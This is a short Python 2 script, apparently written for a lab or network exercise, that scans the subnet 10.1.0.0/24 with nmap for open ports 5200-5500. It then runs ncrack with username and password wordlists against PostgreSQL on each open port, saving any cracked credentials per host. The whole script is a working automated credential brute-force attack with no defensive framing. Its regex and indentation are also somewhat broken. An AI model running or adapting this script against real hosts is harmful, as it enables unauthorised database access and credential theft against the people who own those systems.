import numpy as np
import sys
import os
import re


print "Scanning the network 10.1.0.0/24 for ports in range 5200-5500"
print "..............................................................."

#Running nmap and then Grep to fetch ip's and ports

os.system("nmap -p5200-5500 -T4 10.1.0.0/24 -oN nmapout")
os.system("grep -B4 open nmapout |  grep -o -e \"\d[0-9]\.\d\.\d\.\d[0-9]\" -e \"\d\d\d\d\" > greppedout")

final_list = {}

f = open('greppedout', 'r')

last_ip = ""

for line in f.readlines(): 
	line = line.rstrip('\r\n')
	if re.match(r"^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$", line):
		last_ip = line
		final_list[line] = list()
	elif last_ip != "":
		final_list[last_ip].append(line)

for address in final_list:
    for port in final_list[address]:
    	#os.system("echo "  + address + "port " +port)
		os.system("ncrack -v -U /root/users.txt -P /root/pass.txt psql://" +address+":"+port + " | grep -A1 \"Discovered\" > " +address+"_cracked.txt")

f.close()
